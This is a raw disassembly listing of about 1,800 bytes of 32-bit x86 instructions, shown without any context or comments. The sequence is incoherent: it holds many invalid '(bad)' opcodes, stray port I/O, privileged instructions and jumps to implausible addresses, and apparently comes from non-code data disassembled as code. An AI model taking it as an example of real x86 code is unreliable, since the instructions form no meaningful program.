  41e853:	imul   edx,DWORD PTR [ecx+0xc36324f],0x19
  41e85a:	push   es
  41e85b:	inc    ecx
  41e85c:	or     cl,BYTE PTR [ebp+0x6dad0501]
  41e862:	scas   al,BYTE PTR es:[edi]
  41e863:	push   edi
  41e864:	ja     0x41e8cf
  41e866:	aas    
  41e867:	mov    ds:0x35c8f90,al
  41e86c:	jmp    0x215db963
  41e871:	dec    esi
  41e872:	in     al,dx
  41e873:	add    dl,0xfe
  41e876:	jnp    0x41e83c
  41e878:	xchg   esi,eax
  41e879:	cwde   
  41e87a:	sbb    eax,0xe889d777
  41e87f:	ret    0xb97b
  41e882:	rcl    DWORD PTR [edx+esi*8-0x3],cl
  41e886:	bound  eax,QWORD PTR [edi+edx*4]
  41e889:	test   eax,0xb07f70d3
  41e88e:	and    dl,BYTE PTR [esi-0x2b]
  41e891:	ins    DWORD PTR es:[edi],dx
  41e892:	rcr    DWORD PTR [ebx+0x24],cl
  41e895:	mov    ebp,esi
  41e897:	out    0xc9,al
  41e899:	lea    ecx,[edx-0x22486e2e]
  41e89f:	inc    eax
  41e8a0:	sub    DWORD PTR [edx],esp
  41e8a2:	mov    dl,0xdd
  41e8a4:	mov    edx,0x87b038e5
  41e8a9:	out    dx,eax
  41e8aa:	out    dx,eax
  41e8ab:	(bad)  
  41e8ac:	out    dx,al
  41e8ad:	sar    BYTE PTR [ebx-0x213d5fbc],cl
  41e8b3:	sbb    esi,DWORD PTR [edx+0x28dc28a3]
  41e8b9:	test   eax,0xdf3d0dcf
  41e8be:	mov    ah,0xab
  41e8c0:	jmp    0x41e8be
  41e8c2:	jp     0x41e8e8
  41e8c4:	retf   0x8efe
  41e8c7:	repz sub al,0x79
  41e8ca:	cmp    DWORD PTR [ebx-0x1f],edi
  41e8cd:	(bad)  
  41e8ce:	aam    0xb0
  41e8d0:	mov    eax,0x9cf642f6
  41e8d5:	add    ebp,ebx
  41e8d7:	jmp    0x457f543
  41e8dc:	jg     0x41e8be
  41e8de:	push   es
  41e8df:	xchg   esp,eax
  41e8e0:	in     eax,dx
  41e8e1:	dec    ebx
  41e8e2:	pop    edi
  41e8e3:	pop    edi
  41e8e4:	aaa    
  41e8e5:	fisttp QWORD PTR [edx-0x50cae424]
  41e8eb:	loope  0x41e8e9
  41e8ed:	fs inc edi
  41e8ef:	xchg   DWORD PTR [edx],esi
  41e8f1:	mov    dh,0xb7
  41e8f3:	inc    esi
  41e8f4:	popa   
  41e8f5:	jmp    0x41e915
  41e8f7:	pop    es
  41e8f8:	mov    ds:0xf8b3df30,al
  41e8fd:	hlt    
  41e8fe:	stos   BYTE PTR es:[edi],al
  41e8ff:	ret    0x8b0c
  41e902:	pop    esi
  41e903:	icebp  
  41e904:	add    eax,0x132951c3
  41e909:	cs sub bl,0xf8
  41e90d:	and    BYTE PTR [esi+0x56],cl
  41e910:	xor    edx,DWORD PTR [edi+0x69]
  41e913:	mov    al,ds:0xd67576cc
  41e918:	mov    dl,0xaf
  41e91a:	int3   
  41e91b:	sbb    al,0xb5
  41e91d:	pusha  
  41e91e:	cmp    DWORD PTR [edx],ebp
  41e920:	int3   
  41e921:	outs   dx,BYTE PTR ds:[esi]
  41e922:	xor    BYTE PTR [ecx+0x64bc1c41],dh
  41e928:	xor    eax,0xb1a4ff3b
  41e92d:	sub    al,ah
  41e92f:	outs   dx,BYTE PTR ds:[esi]
  41e930:	mov    ah,0x50
  41e932:	sub    al,0xed
  41e934:	loop   0x41e92f
  41e936:	mov    ds:0xed540bd1,eax
  41e93b:	pusha  
  41e93c:	jp     0x41e93f
  41e93e:	in     al,dx
  41e93f:	lods   al,BYTE PTR ds:[esi]
  41e940:	mov    esp,0x8744bda
  41e945:	sbb    edi,DWORD PTR [edi+edx*1]
  41e948:	sub    BYTE PTR [ecx-0x668a2164],dh
  41e94e:	out    0xf7,eax
  41e950:	pop    esp
  41e951:	iret   
  41e952:	enter  0xfae7,0xc7
  41e956:	stos   DWORD PTR es:[edi],eax
  41e957:	xchg   edi,eax
  41e958:	or     al,0x76
  41e95a:	jl     0x41e900
  41e95c:	xchg   edx,eax
  41e95d:	dec    esi
  41e95e:	test   DWORD PTR [edi],esp
  41e960:	dec    ebp
  41e961:	jge    0x41e8e8
  41e963:	stos   BYTE PTR es:[edi],al
  41e964:	test   eax,0xc8036616
  41e969:	jmp    0xbe2d1730
  41e96e:	mov    al,ds:0x394a1d0e
  41e973:	scas   al,BYTE PTR es:[edi]
  41e974:	in     eax,dx
  41e975:	pop    ebp
  41e976:	scas   al,BYTE PTR es:[edi]
  41e977:	and    BYTE PTR [eax-0x1abfac28],0x9d
  41e97e:	cwde   
  41e97f:	push   ax
  41e981:	ins    DWORD PTR es:[edi],dx
  41e982:	inc    edx
  41e983:	xchg   ebp,eax
  41e984:	stos   DWORD PTR es:[edi],eax
  41e985:	dec    ebx
  41e986:	call   0x426cb60d
  41e98b:	outs   dx,BYTE PTR ds:[esi]
  41e98c:	out    dx,eax
  41e98d:	sbb    esp,DWORD PTR [ebp-0x57]
  41e990:	pop    esi
  41e991:	cmp    al,cl
  41e993:	push   ebp
  41e994:	dec    ecx
  41e995:	iret   
  41e996:	sub    bh,0x9
  41e999:	in     eax,dx
  41e99a:	mov    ebp,0x7b11e388
  41e99f:	adc    esp,DWORD PTR [esi-0x12547120]
  41e9a5:	mov    ebx,0x17555e49
  41e9aa:	aas    
  41e9ab:	xchg   ecx,eax
  41e9ac:	pop    eax
  41e9ad:	mov    dh,al
  41e9af:	mov    BYTE PTR [ecx+0x6],al
  41e9b2:	sbb    BYTE PTR [esi+eiz*2],0xc8
  41e9b6:	push   eax
  41e9b7:	and    al,0x8
  41e9b9:	pop    esi
  41e9ba:	pusha  
  41e9bb:	adc    eax,0x8bad141f
  41e9c0:	mov    eax,ds:0xf94a16f3
  41e9c5:	shl    BYTE PTR [ebp+0x13],1
  41e9c8:	add    DWORD PTR [esi],eax
  41e9ca:	adc    dh,ah
  41e9cc:	add    dl,BYTE PTR [edx+esi*8+0x2e]
  41e9d0:	mov    al,ds:0x6aba1e81
  41e9d5:	mov    al,ds:0x9796238d
  41e9da:	aam    0xa8
  41e9dc:	push   0x3a4a35fd
  41e9e1:	fdivr  QWORD PTR [ebx]
  41e9e3:	pop    ebx
  41e9e4:	jne    0x41e984
  41e9e6:	or     BYTE PTR [ebp+edx*1-0x510b62cb],al
  41e9ed:	adc    al,0x27
  41e9ef:	lods   eax,DWORD PTR ds:[esi]
  41e9f0:	pusha  
  41e9f1:	push   0xffffff95
  41e9f3:	outs   dx,DWORD PTR ds:[esi]
  41e9f4:	in     al,0x49
  41e9f6:	push   edx
  41e9f7:	pop    edi
  41e9f8:	call   0xf3738b2a
  41e9fd:	push   ebp
  41e9fe:	pop    ecx
  41e9ff:	mul    edx
  41ea01:	rcr    BYTE PTR [edx-0x62],cl
  41ea04:	mov    al,ds:0xa1e485a4
  41ea09:	cmp    al,0x5
  41ea0b:	(bad)  
  41ea0c:	push   esp
  41ea0d:	inc    esi
  41ea0e:	imul   ecx,DWORD PTR [edi],0xffffff8a
  41ea11:	sti    
  41ea12:	(bad)  
  41ea13:	pop    edx
  41ea14:	enter  0x7d9f,0x9e
  41ea18:	xor    BYTE PTR [edi-0x531b05c1],dh
  41ea1e:	fild   QWORD PTR [edi]
  41ea20:	das    
  41ea21:	fild   QWORD PTR [di]
  41ea24:	inc    ecx
  41ea25:	(bad)  
  41ea26:	arpl   WORD PTR [esi-0x1c],cx
  41ea29:	shl    BYTE PTR [esi+ebx*4-0x45],1
  41ea2d:	arpl   WORD PTR [esi],ax
  41ea2f:	cli    
  41ea30:	mov    esi,0x1291e39e
  41ea35:	rol    BYTE PTR [ecx+0x75ca26b2],0x3
  41ea3c:	adc    cl,BYTE PTR [edx+0x425778b0]
  41ea42:	add    eax,0xc4dd60d
  41ea47:	push   ebx
  41ea48:	and    DWORD PTR [eax+0x7c3d3198],edi
  41ea4e:	mov    dh,0xb5
  41ea50:	rol    BYTE PTR [edx+0x4f],cl
  41ea53:	lea    ebp,[ecx+0xbfb06ef]
  41ea59:	shl    DWORD PTR [eax-0x27abd6b],0x77
  41ea60:	inc    ecx
  41ea61:	int3   
  41ea62:	sbb    ecx,DWORD PTR [eax-0x4f]
  41ea65:	pop    eax
  41ea66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea67:	outs   dx,DWORD PTR ds:[esi]
  41ea68:	les    esi,FWORD PTR [edx-0x41]
  41ea6b:	push   ebp
  41ea6c:	retf   
  41ea6d:	cmp    eax,edi
  41ea6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea70:	xor    DWORD PTR [eax],eax
  41ea72:	popf   
  41ea73:	mov    bl,0xa8
  41ea75:	or     dh,BYTE PTR [esi]
  41ea77:	lahf   
  41ea78:	lds    edi,FWORD PTR [eax]
  41ea7a:	lock pop esi
  41ea7c:	cwde   
  41ea7d:	fs pop ds
  41ea7f:	mov    ah,0x47
  41ea81:	outs   dx,BYTE PTR ds:[esi]
  41ea82:	cdq    
  41ea83:	sbb    eax,0xac8f0f0a
  41ea88:	loop   0x41ea29
  41ea8a:	int    0xdb
  41ea8c:	mov    al,ds:0xca72134f
  41ea91:	outs   dx,BYTE PTR ds:[si]
  41ea93:	ret    
  41ea94:	out    0x1d,al
  41ea96:	stos   BYTE PTR es:[edi],al
  41ea97:	das    
  41ea98:	loope  0x41ea9e
  41ea9a:	sbb    edi,DWORD PTR [ebx+0x4e]
  41ea9d:	xchg   esi,eax
  41ea9e:	mov    ebx,0x615ab916
  41eaa3:	add    ah,BYTE PTR [esi]
  41eaa5:	leave  
  41eaa6:	lahf   
  41eaa7:	xchg   edx,eax
  41eaa8:	or     DWORD PTR [eax-0x64b592c3],0xf9911c43
  41eab2:	icebp  
  41eab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eab4:	jo     0x41eac3
  41eab6:	int    0x7f
  41eab8:	dec    esp
  41eab9:	dec    edx
  41eaba:	fld    DWORD PTR [edi]
  41eabc:	sti    
  41eabd:	add    al,0xe5
  41eabf:	in     al,dx
  41eac0:	nop
  41eac1:	shl    dh,0xec
  41eac4:	pop    eax
  41eac5:	fisttp WORD PTR [esp+ecx*1]
  41eac8:	xchg   DWORD PTR [edi+ebp*1],ebp
  41eacb:	dec    esp
  41eacc:	ins    BYTE PTR es:[edi],dx
  41eacd:	retf   
  41eace:	xchg   edx,eax
  41eacf:	or     DWORD PTR [ebx-0x69],esi
  41ead2:	xchg   ecx,eax
  41ead3:	mov    cl,0x7
  41ead5:	retf   0xf62d
  41ead8:	jl     0x41eb00
  41eada:	icebp  
  41eadb:	neg    DWORD PTR [edi+0xf678c3f]
  41eae1:	ret    0xf477
  41eae4:	inc    edx
  41eae5:	or     bh,BYTE PTR [edi+ebx*4-0x17]
  41eae9:	or     cl,BYTE PTR ds:0xde82da2e
  41eaef:	add    bl,dh
  41eaf1:	push   edi
  41eaf2:	jecxz  0x41eb3d
  41eaf4:	pop    ecx
  41eaf5:	std    
  41eaf6:	out    0xf0,eax
  41eaf8:	div    BYTE PTR [edi]
  41eafa:	pop    ebx
  41eafb:	cwde   
  41eafc:	loopne 0x41eb6b
  41eafe:	xchg   ebp,eax
  41eaff:	je     0x41eacd
  41eb01:	mov    al,ds:0x4aa16b10
  41eb06:	mov    dh,dh
  41eb08:	add    eax,0xc4cb5eaf
  41eb0d:	xchg   esp,eax
  41eb0e:	rol    BYTE PTR [edi],1
  41eb10:	stc    
  41eb11:	dec    esp
  41eb12:	mov    esp,0x578d9c4a
  41eb17:	pop    DWORD PTR [ebp+0x10]
  41eb1a:	sbb    edx,ecx
  41eb1c:	push   0xffffffb5
  41eb1e:	mov    eax,0x12510b68
  41eb23:	pushf  
  41eb24:	inc    ecx
  41eb25:	pop    ds
  41eb26:	cmp    BYTE PTR [esi+0x48e3849f],bh
  41eb2c:	xlat   BYTE PTR ds:[ebx]
  41eb2d:	sbb    dl,BYTE PTR [ebp+0x55]
  41eb30:	js     0x41eac2
  41eb32:	xchg   DWORD PTR [eax+0x610207b4],ebp
  41eb38:	mov    WORD PTR [edi-0x19],fs
  41eb3b:	int    0x72
  41eb3d:	test   BYTE PTR [ebp-0x73],0x8f
  41eb41:	lahf   
  41eb42:	push   0xffffffa5
  41eb44:	mov    al,ds:0x2cb2aa99
  41eb49:	adc    al,dh
  41eb4b:	mov    WORD PTR [eax+0x70f99e01],cs
  41eb51:	lahf   
  41eb52:	add    ebp,DWORD PTR [edi+eiz*1+0x51d0e618]
  41eb59:	mov    ch,0x9d
  41eb5b:	xlat   BYTE PTR ds:[ebx]
  41eb5c:	test   eax,0xd8cc70aa
  41eb61:	fs pop edx
  41eb63:	test   BYTE PTR [ecx],ah
  41eb65:	in     eax,0xae
  41eb67:	ss sbb eax,DWORD PTR ss:[edx]
  41eb6b:	mov    bh,0xac
  41eb6d:	mov    BYTE PTR ds:0x6d78dd93,bh
  41eb73:	sbb    ecx,DWORD PTR [ebx+0x42e1a9bc]
  41eb79:	lea    ebp,[ebx+0x39]
  41eb7c:	mov    BYTE PTR [eax-0xb258ce0],cl
  41eb82:	xor    DWORD PTR [ecx-0x728252ff],eax
  41eb88:	inc    ebx
  41eb89:	xlat   BYTE PTR ds:[ebx]
  41eb8a:	mov    esi,0x33a4aa08
  41eb8f:	aaa    
  41eb90:	gs (bad) 
  41eb92:	(bad)  
  41eb93:	dec    ebp
  41eb94:	pop    edi
  41eb95:	sub    DWORD PTR [edx],esp
  41eb97:	mov    DWORD PTR [edi+0x5b31657c],ecx
  41eb9d:	or     al,0xd4
  41eb9f:	dec    edi
  41eba0:	popf   
  41eba1:	retf   
  41eba2:	in     eax,dx
  41eba3:	fxtract 
  41eba5:	stc    
  41eba6:	lods   eax,DWORD PTR ds:[esi]
  41eba7:	pop    edi
  41eba8:	sti    
  41eba9:	int3   
  41ebaa:	dec    edx
  41ebab:	pop    eax
  41ebac:	cmp    ah,BYTE PTR [edx+0x7ffcccce]
  41ebb2:	sahf   
  41ebb3:	in     al,dx
  41ebb4:	xchg   BYTE PTR [edi],dl
  41ebb6:	xchg   DWORD PTR [eax-0x4251dca3],eax
  41ebbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebbd:	daa    
  41ebbe:	sahf   
  41ebbf:	daa    
  41ebc0:	inc    edx
  41ebc1:	and    edx,DWORD PTR [edx+0x7e078115]
  41ebc7:	mov    ebp,0x48b82417
  41ebcc:	xor    DWORD PTR [ecx-0xd],ecx
  41ebcf:	aaa    
  41ebd0:	inc    ebx
  41ebd1:	addr16 call 0x1f47:0x3099bfea
  41ebd9:	mov    eax,0xd11e7a57
  41ebde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebdf:	xor    BYTE PTR [esi-0x64be2946],al
  41ebe5:	inc    edx
  41ebe6:	ins    DWORD PTR es:[edi],dx
  41ebe7:	sub    cl,BYTE PTR [ecx-0x58]
  41ebea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebeb:	sbb    BYTE PTR [edx-0x34992798],0xa7
  41ebf2:	pop    ebx
  41ebf3:	inc    edx
  41ebf4:	pop    ss
  41ebf5:	pop    eax
  41ebf6:	cli    
  41ebf7:	adc    BYTE PTR [edi+eax*2+0x15],dh
  41ebfb:	repz xlat BYTE PTR ds:[ebx]
  41ebfd:	call   0x8d007f3f
  41ec02:	pop    si
  41ec04:	out    0x6e,eax
  41ec06:	sub    DWORD PTR [eax+0x53],edi
  41ec09:	jnp    0x41ec2d
  41ec0b:	pslld  mm3,mm7
  41ec0e:	jo     0x41ebc6
  41ec10:	fsub   QWORD PTR [edx-0x7f]
  41ec13:	xchg   ebp,eax
  41ec14:	popf   
  41ec15:	mov    WORD PTR [edx+0x2ca0e952],ss
  41ec1b:	dec    ebx
  41ec1c:	lds    ebx,FWORD PTR [eax]
  41ec1e:	cmp    al,0x56
  41ec20:	retf   
  41ec21:	and    eax,0xf5efca6d
  41ec26:	sub    al,0x3a
  41ec28:	cli    
  41ec29:	loopne 0x41ebbb
  41ec2b:	xlat   BYTE PTR ds:[ebx]
  41ec2c:	or     DWORD PTR [eax],edx
  41ec2e:	shl    bl,0xf4
  41ec31:	pop    ss
  41ec32:	(bad)
  41ec35:	fld    st(6)
  41ec37:	dec    edx
  41ec38:	mov    edi,0xda4c7893
  41ec3d:	enter  0x5eb1,0x30
  41ec41:	xchg   ecx,eax
  41ec42:	cmp    al,0x64
  41ec44:	xchg   BYTE PTR es:[eax-0x571ed3a4],ah
  41ec4b:	mov    WORD PTR [edx],gs
  41ec4d:	mov    esi,0xb0f6f611
  41ec52:	xor    eax,0xe134a148
  41ec57:	imul   esi,DWORD PTR [edi+ecx*8+0x6b41c481],0x81c79519
  41ec62:	cmp    eax,0xc4f14f1a
  41ec67:	scas   al,BYTE PTR es:[edi]
  41ec68:	ins    DWORD PTR es:[edi],dx
  41ec69:	cmp    BYTE PTR cs:[eax-0x4ca93263],cl
  41ec70:	(bad)  
  41ec71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec72:	sub    al,0xc9
  41ec74:	cmc    
  41ec75:	aam    0xa7
  41ec77:	pop    edi
  41ec78:	and    BYTE PTR [edi+0x4f],bh
  41ec7b:	dec    eax
  41ec7c:	aas    
  41ec7d:	pop    esp
  41ec7e:	add    eax,0x8fc31f17
  41ec83:	add    DWORD PTR [edx],eax
  41ec85:	sub    DWORD PTR [eax-0xe490d25],edi
  41ec8b:	outs   dx,BYTE PTR ds:[esi]
  41ec8c:	gs jno 0x41ec2b
  41ec8f:	add    esi,ecx
  41ec91:	xor    ch,BYTE PTR [edi]
  41ec93:	dec    ebp
  41ec94:	nop
  41ec95:	mov    ebx,0xf37cad2
  41ec9a:	mov    BYTE PTR [eax-0x6c91c9ec],dl
  41eca0:	mov    ebx,0xbccf341e
  41eca5:	push   ecx
  41eca6:	and    DWORD PTR [edi],esi
  41eca8:	int3   
  41eca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecaa:	ror    BYTE PTR [eax+0x5f],1
  41ecad:	(bad)  
  41ecaf:	jmp    0xef8ff062
  41ecb4:	into   
  41ecb5:	or     eax,0x71a04372
  41ecba:	push   esp
  41ecbb:	loope  0x41ec72
  41ecbd:	ror    DWORD PTR [edx],0x37
  41ecc0:	mov    esi,0x467751ed
  41ecc5:	push   ss
  41ecc6:	sbb    bl,BYTE PTR [edx-0xa7aefed]
  41eccc:	retf   
  41eccd:	jmp    0x3bf55a7
  41ecd2:	xchg   edi,eax
  41ecd3:	jae    0x41ed2b
  41ecd5:	add    al,0x5c
  41ecd7:	push   ebx
  41ecd8:	mov    ebp,0x36ca796d
  41ecdd:	or     al,0xa1
  41ecdf:	cmp    ebp,DWORD PTR [ebp-0x25f77340]
  41ece5:	or     DWORD PTR [ecx],esi
  41ece7:	dec    esp
  41ece8:	or     dl,cl
  41ecea:	leave  
  41eceb:	sbb    eax,0x29ba0517
  41ecf0:	rcr    BYTE PTR [eax],1
  41ecf2:	push   edx
  41ecf3:	jmp    0x41ecf7
  41ecf5:	mov    dl,0x39
  41ecf7:	or     al,0xbc
  41ecf9:	lods   al,BYTE PTR ds:[esi]
  41ecfa:	and    BYTE PTR [edi],dl
  41ecfc:	retf   0x571
  41ecff:	lds    edi,FWORD PTR [ebp-0x2b]
  41ed02:	pusha  
  41ed03:	adc    al,0x37
  41ed05:	aam    0x9d
  41ed07:	stc    
  41ed08:	mov    edi,0xfa8d27a6
  41ed0d:	lahf   
  41ed0e:	loop   0x41ecea
  41ed10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed11:	add    BYTE PTR [edx],ch
  41ed13:	sysenter 
  41ed15:	popa   
  41ed16:	aad    0x6
  41ed18:	push   0x5a
  41ed1a:	xor    ebp,esi
  41ed1c:	mov    ds:0x61419b70,eax
  41ed21:	neg    BYTE PTR [edx-0x65]
  41ed24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed25:	fnstenv [edx+eax*8]
  41ed28:	lods   al,BYTE PTR ds:[esi]
  41ed29:	mov    al,0x41
  41ed2b:	stos   DWORD PTR es:[edi],eax
  41ed2c:	(bad)  
  41ed2d:	mov    ecx,0xac59e7ce
  41ed32:	xor    eax,0xf1ccefbb
  41ed37:	dec    edi
  41ed38:	cs pop esi
  41ed3a:	sti    
  41ed3b:	sahf   
  41ed3c:	(bad)  
  41ed3d:	into   
  41ed3e:	dec    esi
  41ed3f:	dec    ebx
  41ed40:	sub    eax,0xd5b0aedb
  41ed45:	push   edi
  41ed46:	xchg   ecx,eax
  41ed47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ed48:	xchg   ebp,eax
  41ed49:	mov    ch,0x8f
  41ed4b:	cmovae ebp,DWORD PTR [esi]
  41ed4e:	(bad)  
  41ed4f:	sbb    esp,esi
  41ed51:	mov    esp,0x74e12c8e
  41ed56:	add    al,0xc5
  41ed58:	div    DWORD PTR [eax]
  41ed5a:	mov    dh,0x2d
  41ed5c:	loope  0x41ed1e
  41ed5e:	jbe    0x41ed47
  41ed60:	push   ebp
  41ed61:	mov    eax,0xcc2966bc
  41ed66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed67:	pop    esp
  41ed68:	jne    0x41edcc
  41ed6a:	arpl   WORD PTR [eax],si
  41ed6c:	(bad)  
  41ed6e:	and    ch,BYTE PTR [edx-0x3e3f5213]
  41ed74:	push   ebp
  41ed75:	mov    cl,0x91
  41ed77:	jns    0x41ecfb
  41ed79:	push   ds
  41ed7a:	xlat   BYTE PTR ds:[ebx]
  41ed7b:	xchg   BYTE PTR [ecx-0xd],dh
  41ed7e:	pop    esi
  41ed7f:	xor    ebp,DWORD PTR [eax]
  41ed81:	jne    0x41ed09
  41ed83:	into   
  41ed84:	cmp    al,0xfd
  41ed86:	inc    esi
  41ed87:	retf   0x1253
  41ed8a:	dec    edx
  41ed8b:	in     al,0xd9
  41ed8d:	mov    ebx,0x1e861407
  41ed92:	das    
  41ed93:	inc    edi
  41ed94:	mov    ecx,0xf78db08e
  41ed99:	xlat   BYTE PTR ds:[ebx]
  41ed9a:	addr16 not esi
  41ed9d:	jmp    0x31cb:0x234dc08e
  41eda4:	ror    ebp,cl
  41eda6:	mov    DWORD PTR [edi-0x1925dece],ebx
  41edac:	xchg   BYTE PTR [ebx+0x7a],al
  41edaf:	pop    esp
  41edb0:	jle    0x41edcb
  41edb2:	xchg   esp,eax
  41edb3:	mov    BYTE PTR [eax],ah
  41edb5:	pop    eax
  41edb6:	fadd   DWORD PTR [esi]
  41edb8:	push   ss
  41edb9:	or     esp,DWORD PTR [esi+0x17]
  41edbc:	jo     0x41ed56
  41edbe:	jge    0x41ee3d
  41edc0:	sbb    esi,DWORD PTR [edx-0x39]
  41edc3:	pop    ecx
  41edc4:	xchg   edx,eax
  41edc5:	hlt    
  41edc6:	jbe    0x41ed81
  41edc8:	into   
  41edc9:	es pop ebx
  41edcb:	cmp    eax,0xd4f7a9ad
  41edd0:	jbe    0x41ede0
  41edd2:	xchg   ebp,eax
  41edd3:	jle    0x41edeb
  41edd5:	addr16 (bad) 
  41edd7:	pop    ebp
  41edd8:	cmc    
  41edd9:	mov    al,ds:0x7671ea4d
  41edde:	in     eax,0x80
  41ede0:	int3   
  41ede1:	add    esi,ebp
  41ede3:	popa   
  41ede4:	mov    ah,0x9c
  41ede6:	pop    eax
  41ede7:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ede9:	in     eax,dx
  41edea:	mul    DWORD PTR [edx]
  41edec:	into   
  41eded:	into   
  41edee:	jmp    FWORD PTR [edx+0x17]
  41edf1:	or     al,0xbb
  41edf3:	dec    eax
  41edf4:	jmp    0x41edfc
  41edf6:	mov    ds:0xa9f2e32,al
  41edfb:	hlt    
  41edfc:	xor    BYTE PTR [edi+0x32],dl
  41edff:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee01:	push   es
  41ee02:	retf   0x3456
  41ee05:	pop    ebx
  41ee06:	mov    ebx,0xd7abf4f
  41ee0b:	out    0x13,eax
  41ee0d:	scas   al,BYTE PTR es:[edi]
  41ee0e:	scas   eax,DWORD PTR es:[edi]
  41ee0f:	lds    edx,FWORD PTR [ecx+eax*1+0x53]
  41ee13:	xchg   ebx,eax
  41ee14:	shr    BYTE PTR [ebp+0x71],cl
  41ee17:	jp     0x41edb8
  41ee19:	icebp  
  41ee1a:	pop    ss
  41ee1b:	cld    
  41ee1c:	repz dec esi
  41ee1e:	cmp    DWORD PTR [ebx],eax
  41ee20:	adc    edx,DWORD PTR [ebx-0x74709dff]
  41ee26:	outs   dx,BYTE PTR ds:[esi]
  41ee27:	sbb    DWORD PTR [ebx+0x5c241de7],esp
  41ee2d:	dec    ecx
  41ee2e:	outs   dx,BYTE PTR ds:[esi]
  41ee2f:	scas   al,BYTE PTR es:[edi]
  41ee30:	mov    esi,0x5340addc
  41ee35:	cmp    BYTE PTR [eax+0x4b9636b1],0xa3
  41ee3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee3d:	mov    ah,0xde
  41ee3f:	cmp    BYTE PTR [eax+ebx*1+0x60],0xfb
  41ee44:	xchg   DWORD PTR [ecx+0x42],esi
  41ee47:	(bad)  
  41ee49:	pusha  
  41ee4a:	and    al,0x90
  41ee4c:	sub    DWORD PTR [ebx-0x54f033c2],edi
  41ee52:	pop    ebx
  41ee53:	(bad)  
  41ee54:	loopne 0x41ee9e
  41ee56:	out    dx,eax
  41ee57:	shl    BYTE PTR [ebx+0x1e],cl
  41ee5a:	mov    bl,0x8b
  41ee5c:	lock test al,0xe6
  41ee5f:	test   bl,ch
  41ee61:	mov    esi,0x6132889e
  41ee66:	xchg   edi,eax
  41ee67:	(bad)  
  41ee68:	in     eax,dx
  41ee69:	inc    ebx
  41ee6a:	inc    edx
  41ee6b:	repz jl 0x41ee3a
  41ee6e:	loopne 0x41eed0
  41ee70:	sar    BYTE PTR [edi+0x3],0xb3
  41ee74:	xchg   esi,eax
  41ee75:	fsubr  DWORD PTR [esi+esi*8-0x2d60ff64]
  41ee7c:	jb     0x41ee8c
  41ee7e:	in     al,0x6e
  41ee80:	arpl   dx,sp
  41ee82:	and    al,0x34
  41ee84:	(bad)  
  41ee85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee86:	test   al,0xd0
  41ee88:	jne    0x41eebb
  41ee8a:	xchg   edi,eax
  41ee8b:	jns    0x41eed4
  41ee8d:	pop    ebp
  41ee8e:	outs   dx,DWORD PTR ds:[esi]
  41ee8f:	push   ebx
  41ee90:	pop    ebp
  41ee91:	cmp    DWORD PTR [ebp-0x4b],ebx
  41ee94:	rol    DWORD PTR [edx-0x26],0x9c
  41ee98:	rol    BYTE PTR [esi-0x6f9854ab],cl
  41ee9e:	pop    esi
  41ee9f:	or     BYTE PTR [eax],cl
  41eea1:	mov    DWORD PTR [eax+0x471a3ca8],edi
  41eea7:	daa    
  41eea8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eea9:	or     al,0xc3
  41eeab:	and    DWORD PTR [esp+ebx*1],0xffffffda
  41eeaf:	mov    bl,0x53
  41eeb1:	xchg   DWORD PTR [esi+0xc99b58b],esi
  41eeb7:	jle    0x41ef07
  41eeb9:	push   esp
  41eeba:	lods   al,BYTE PTR ds:[esi]
  41eebb:	push   ecx
  41eebc:	fcomp  DWORD PTR [ebp+0x36b50792]
  41eec2:	arpl   WORD PTR [eax+0x37],dx
  41eec5:	sbb    BYTE PTR [edi],dl
  41eec7:	repnz xor dl,BYTE PTR [eax]
  41eeca:	test   eax,0x4dd881b7
  41eecf:	mov    dh,bh
  41eed1:	rcl    DWORD PTR [ebp+0xd],1
  41eed4:	stc    
  41eed5:	or     ecx,DWORD PTR [ebp-0x19d9e09c]
  41eedb:	jmp    0xe5b5:0xf4c3d702
  41eee2:	jl     0x41ef61
  41eee4:	(bad)  
  41eee5:	dec    esp
  41eee6:	push   es
  41eee7:	mov    edx,0xfa88cd8d
  41eeec:	jge    0x41eef8
  41eeee:	pop    esi
  41eeef:	in     eax,dx
  41eef0:	xchg   edi,eax
  41eef1:	popa   
  41eef2:	retf   
  41eef3:	sbb    eax,0x9ab3c24f
  41eef8:	add    al,0xc5
  41eefa:	jnp    0x41eedc
  41eefc:	sub    DWORD PTR [esi+ecx*1],0x14ca673d
  41ef03:	arpl   WORD PTR [eax],bp
  41ef05:	xor    al,bh
  41ef07:	inc    edx
  41ef08:	push   edi
  41ef09:	xlat   BYTE PTR ds:[ebx]
  41ef0a:	(bad)  
  41ef0b:	iretw  
  41ef0d:	push   esp
  41ef0e:	jg     0x41eeb9
  41ef10:	scas   al,BYTE PTR es:[edi]
  41ef11:	out    0x3d,al
  41ef13:	inc    ebx
  41ef14:	add    BYTE PTR [esp+ebx*8+0x25],dl
  41ef18:	neg    dl
  41ef1a:	cmp    esp,DWORD PTR [edi]
  41ef1c:	int3   
  41ef1d:	rcl    BYTE PTR [edx-0x733b7e55],0xe6
  41ef24:	mov    ds:0xb131de96,eax
  41ef29:	int    0xbe
  41ef2b:	in     eax,dx
  41ef2c:	inc    ebp
  41ef2d:	scas   al,BYTE PTR es:[edi]
  41ef2e:	xor    eax,0x72a3ad3
  41ef33:	xor    ah,dl
  41ef35:	mov    bh,ah
  41ef37:	or     edx,0x20
  41ef3a:	pushf  
  41ef3b:	xchg   edx,eax
  41ef3c:	jle    0x41ef97
  41ef3e:	ja     0x41ef9d
  41ef40:	sub    DWORD PTR [edx-0x6c],ebx
  41ef43:	mov    edi,0x75a53f5e
